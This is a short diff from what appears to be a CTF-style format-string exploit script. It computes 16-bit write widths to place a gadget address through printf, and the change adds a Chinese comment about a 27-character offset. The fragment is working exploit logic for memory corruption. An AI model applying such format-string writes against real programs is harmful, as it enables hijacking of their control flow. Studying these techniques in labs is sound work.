@@ -22,7 +22,7 @@ payload = b'Remind me to '
 write_size = 0
 for i in range(3):
     vulen  = (gadget>>(i*16)) & 0xffff
-    vulen -= 27
+    vulen -= 27  # printf前面还有27个字符的大小
     # 对于每个字节，我们都需要写入一个字节，所以我们需要写入vulen个字节
     # 如果已经输入的字符大于了将要输入的值, 那么我们就需要输入对应的负数
     if(vulen > write_size&0xffff):
